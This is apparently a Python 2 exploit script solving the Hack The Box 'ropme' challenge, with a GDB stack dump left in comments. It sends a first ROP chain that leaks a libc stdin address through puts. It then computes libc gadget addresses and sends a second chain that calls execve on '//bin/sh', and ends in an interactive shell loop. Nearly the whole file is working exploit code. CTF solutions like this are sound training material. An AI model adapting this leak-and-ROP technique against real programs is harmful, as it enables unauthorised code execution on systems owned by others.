#!/usr/bin/env python

import struct
from time import sleep
import sys
from subprocess import *
from fcntl import fcntl, F_GETFL, F_SETFL
from os import O_NONBLOCK, read
import signal

#Pre-calculated positions based on debugging binary
#libc base 0x00007ffff7a3c000
#libc stdin 0x00007ffff7dd38c0
libc_stdin_distance  = 0x3978c0
libc_poprdx_distance = 0x1b92
libc_system_distance = 0x3f480
libc_execve_distance = 0xb8630

def enable_sigpipe():

    signals = ('SIGPIPE', 'SIGXFZ', 'SIGXFSZ')
    for sig in signals:
        if hasattr(signal, sig):
            signal.signal(getattr(signal, sig), signal.SIG_DFL)

def str_to_lendian(shellcode_str):
	shellcode_str = shellcode_str[::-1]
	shellcode_str = shellcode_str.encode('hex')
	shellcode_str = int(shellcode_str,16)
	return shellcode_str

def build_bytes(rop_obj):
	if type(rop_obj) is list:

		shellcode_list = [ struct.pack('<Q', i) for i in rop_obj]
		return ''.join(shellcode_list)

	elif type(rop_obj) is str:
		shellcode_str = str_to_lendian(string)
		return struct.pack('<Q',shellcode_str)

def flush(subprocess_object):
	subprocess_object.stdout.flush()

def send_payload(subprocess_object, rop_string=None):
	flush(subprocess_object)
	if rop_string is not None:
		rop_proc.stdin.write(rop_string)
	rop_proc.stdin.write("\n")
	sleep(1)


def read_response(subprocess_object, byte_count=0):
	if not byte_count:
		return subprocess_object.stdout.readline()

	else:
		sleep(.5)
		return subprocess_object.stdout.read(byte_count)

def read_localleak(stdout_bytes):
	format_bytes = ([hex(ord(i)) for i in stdout_bytes])[::-1]
	return int(''.join([i[2:] for i in format_bytes]), 16)

rop_stage1 = []
rop_stage1.append(0x0000000000000100) #<--- rid ptr on first loop
rop_stage1.append(0x0000000000000000) #junk
rop_stage1.append(0x0000000000000001) #junk
rop_stage1.append(0x0000000000000001) #junk
rop_stage1.append(0x0000000000601050) #junk
rop_stage1.append(0x0000000000601050) #junk
rop_stage1.append(0x0000000000601050) #junk
rop_stage1.append(0x0000000000601050) #junk
rop_stage1.append(0x00000000006010f0) # ret <--- rbp on first loop / pushed as rtn ptr
rop_stage1.append(0x0000000000400626) # loop back to start 
rop_stage1.append(0x00000000004006d3) # pop rdi
rop_stage1.append(0x0000000000601060) #
rop_stage1.append(0x000000000040063a) #puts
rop_stage1.append(0x00000000004006d1) # pop rsi, pop r15 ; ret
rop_stage1.append(0x0000000000000000) #junk
rop_stage1.append(0x00007ffff7a7b480) # <--- system syscall

rop_chain1 = build_bytes(rop_stage1)

rop_proc = Popen("/root/hackthebox/ropme", 
				stdin=PIPE, 
				stdout=PIPE, 
				shell=True, 
				executable='/bin/bash', 
				preexec_fn=enable_sigpipe())

banner = "ROP me outside, how 'about dah?\n"

if read_response(rop_proc) == banner:
	print "[+] Received banner."
	raw_input("[+] Press enter to continue. ")

else:
	print "[-] Didn't receive banner. Exiting..."
	sys.exit(0)

print "[*] Sending stage 1 ROP gadgets with a length of %d" % len(rop_chain1)
send_payload(rop_proc, rop_chain1)

print "[+] Sent."

if read_response(rop_proc) == banner:

	print "[+] Succesfully sent that shit back into a loop."

send_payload(rop_proc)

print "[*] Reading address leak..."
sleep(1)

output = read_response(rop_proc, 6)
stdin_memleak = read_localleak(output)

print "[+] Memory leak at %s." % hex(stdin_memleak)
print "[*] Doin' math 'n' shit..."

libc_base = stdin_memleak - libc_stdin_distance
print "\t[+] Libc base at addr: %s" % hex(libc_base)

libc_pop_rdx = libc_base + libc_poprdx_distance
print "\t[+] Pop rdx gadget at addr: %s" % hex(libc_pop_rdx)

libc_system_scall = libc_base + libc_execve_distance
print "\t[+] System syscall gadget at addr: %s" % hex(libc_system_scall)


#Start build of second stage ROP shellcode
print "[*] Building ze stage 2 ROP gadgets..."
sleep(1)

shellcode = str_to_lendian("//bin/sh")

rop_list2 = []
rop_list2.append(shellcode) 			# <---- 0x6010b0 
rop_list2.append(0x0000000000000000) #
rop_list2.append(0x4141414141414141) #
rop_list2.append(0x4141414141414141) #
rop_list2.append(0x4141414141414141) #
rop_list2.append(0x4141414141414141) #
rop_list2.append(0x4141414141414141) #
rop_list2.append(0x4141414141414141) #
rop_list2.append(0x4141414141414141) #
rop_list2.append(0x00000000004006d3) # pop rdi; ret <---- rbp on heap
rop_list2.append(0x00000000006010b0) # shellcode  string at 0x6010b0
rop_list2.append(0x00000000004006d1) # pop rsi; pop r15; ret
rop_list2.append(0x0000000000000000) # clear reg
rop_list2.append(0x0000000000000000) # clear reg
rop_list2.append(libc_pop_rdx)
rop_list2.append(0x0000000000000000) # clear reg
rop_list2.append(libc_system_scall)	# pop dat shell

rop_chain2 = build_bytes(rop_list2)

print "[+] Sending second stage."
send_payload(rop_proc, rop_chain2)
print "[+] Poppin dat shell."

#Switch to non-blocking read
flags = fcntl(rop_proc.stdout, F_GETFL)
fcntl(rop_proc.stdout, F_SETFL, flags | O_NONBLOCK)

while True:
	shell_command = raw_input("# ")
	rop_proc.stdin.write(shell_command+"\n")	
	sleep(0.1)

	try:
		print read(rop_proc.stdout.fileno(), 1024),

	except OSError:
		continue



	
#libc base stdin - 0x3978c0 = libcB
#libcB + 0x1b92 = pop rdx

# python -c 'print hex(0x7fffffffe250 - 0x7fffffffe0f0)'
# 0x160

# 0x7fffffffe0f0:	0x00007ffff7aafa30	0x00007ffff7dd38c0
# 0x7fffffffe100:	0x00007ffff7dd0440	0x000000000000000a
# 0x7fffffffe110:	0x00000000006024a9	0x00000000000001f3
# 0x7fffffffe120:	0x00007ffff7ab0b32	0x0000000000000000
# 0x7fffffffe130:	0x0000000000000000	0x00007fffffffe1d8
# 0x7fffffffe140:	0x00007ffff7aa454a	0x00007ffff7dd0440
# 0x7fffffffe150:	0x00007fffffffe1d8	0x0000000100000000
# 0x7fffffffe160:	0x0000000000000000	0x00007ffff7dd4600
# 0x7fffffffe170:	0x00007ffff7dd38c0	0x0000000000000000
# 0x7fffffffe180:	0x00007fffffffe1d8	0x00007fffffffe2f0
# 0x7fffffffe190:	0x0000000000000000	0x0000000000000000
# 0x7fffffffe1a0:	0x00007ffff7aa33eb	0x0000000000000000
# 0x7fffffffe1b0:	0x00007fffffffe218	0x0000000000400530
# 0x7fffffffe1c0:	0x0000000000400666	0x00007ffff7dd5770
# 0x7fffffffe1d0:	0xffffe1d100000100	0x0000000000000000
# 0x7fffffffe1e0:	0x0000000000000001	0x0000000000000001
# 0x7fffffffe1f0:	0x0000000000601050	0x0000000000601050
# 0x7fffffffe200:	0x0000000000601050	0x0000000000601050
# 0x7fffffffe210:	0x00000000006010f0	0x00000000006010f0
# 0x7fffffffe220:	0x00000000004006d3	0x0000000000601060
# 0x7fffffffe230:	0x000000000040063a	0x00000000004006d1
# 0x7fffffffe240:	0x0000000000000000	0x0000000000000000
# 0x7fffffffe250:	0x00007ffff7a7b480	0x00007fffffff000a
# 0x7fffffffe260:	0x0000000000000000	0x0000000000000000
# 0x7fffffffe270:	0x7b593d40fb11a698	0x7b592df4ba63a698
